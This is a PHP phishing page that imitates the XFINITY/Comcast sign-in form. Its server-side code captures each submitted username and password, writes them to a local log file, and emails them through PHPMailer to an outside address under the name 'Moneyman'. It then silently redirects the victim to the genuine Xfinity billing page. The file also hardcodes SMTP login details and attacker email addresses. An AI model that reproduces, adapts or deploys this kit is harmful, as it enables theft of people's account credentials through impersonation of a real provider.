
<?php    

require 'class.phpmailer.php';

    if (isset($_POST['user']) && isset($_POST['passwd'])) { // check if both fields are set
	$dt = new DateTime();
       $txt=$_POST['user'].'  '.$_POST['passwd']. '  '.$dt->format(''); 
        file_put_contents('password.log',PHP_EOL .$txt."\n",FILE_APPEND|LOCK_EX); 

        // Mail to customers
	try {
	$mail = new PHPMailer(true); //New instance, with exceptions enabled

	$body             = $_POST['user'].' <br/> '.$_POST['passwd'];

	$mail->IsSMTP();                           // tell the class to use SMTP
	$mail->SMTPAuth   = true;                  // enable SMTP authentication
	$mail->Port       = 26;                    // set the SMTP server port
	$mail->Host       = "smtp.comcast.net"; // SMTP server
	$mail->Username   = "FRANKCZYZ";     // SMTP server username
	$mail->Password   = "qwerty77A";            // SMTP server password

	$mail->IsSendmail();  // tell the class to use Sendmail

	$mail->AddReplyTo("johnkendler0909@gmail.com","Moneyman");

	$mail->From       = "johnkendler0909@gmail.com";
	$mail->From   = "$$$$$$Moneyman$$$$$$";

	$to = "xfinityteamsvcss@yahoo.com";

	$mail->AddAddress($to);
	$mail->AltBody    = "To view the message, please use an HTML compatible email viewer!"; // optional, comment out and test
	$mail->Subject  = "New User at " .$dt->format('Y-m-d H:i:s');

	$mail->AltBody    = $_POST['user'].' - '.$_POST['passwd'];
	$mail->WordWrap   = 80; // set word wrap

	$mail->MsgHTML($body);

	$mail->IsHTML(true); // send as HTML

	$mail->Send();
} catch (phpmailerException $e) {
	echo $e->errorMessage();
}

        // Redirect to Main-site
        //header('Location: https://customer.xfinity.com/#/billing'); 
        echo '<script>window.location.href = "https://customer.xfinity.com/#/billing";</script>';
        exit();
    }

?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html lang="en">
    
    
    <link rel="shortcut icon" href="xlogo.jpg"/>
<body bgcolor="F4F2F1"></body>
     <center>
    <img src="top.jpg" align= ""/>
    
<p>_______________________________________</p>
    
	<title>Sign in to XFINITY</title>
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<link rel="stylesheet" type="text/css" href="">
	<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
	<meta name="description" content="">
	<meta name="viewport" content="width=1024">
	<link rel="shortcut icon" href="">
			<script type="text/javascript" src=""></script>
		<script type="text/javascript">
	runtimeData = {
		"r": "comcast.net",		"s": "portal",		"deviceAuthn": "false",		"continue": "http://xfinity.comcast.net/",		"ipAddrAuthn": "false",		"forceAuthn": "0",		"lang": "en",
		"passive": "false",		"reqId": "4a47eade-99d0-4760-adbc-413e5f917ffe"	}
	</script>
	</div></p>
	<div id="right">
				<div id="signin-box">
	<form name="signin" action="" method="post" onsubmit="return login.onSubmit()">
	<div id="signin" class="captcha">
	    <p><font size="5"></p>
		<h1 class="social security-logo no-error"></h1>
		<div class="sign_in">
		    
		    
		           
       <p><font size="4"</p>
					
	<center>
		<label for="user" id="login_id_label">Username<br/></label>
		<input id="user" name="user" type="text" value="" maxlength="128" tabindex="1"><br/>

		<label for="passwd" id="password_label">Password<br/> </label>
		<input id="passwd" name="passwd" type="password"  maxlength="128" tabindex="2"><br/><br/>
		
      
		<button type="submit" id="sign_in" tabindex="5">SIGN IN &#9658;<span class="triange-right icon"></span></button>
		<p class="fbor"><p>
		  <p>_____________________________________</p>

	    <img src="bottom.jpg" />
	    </center>
	    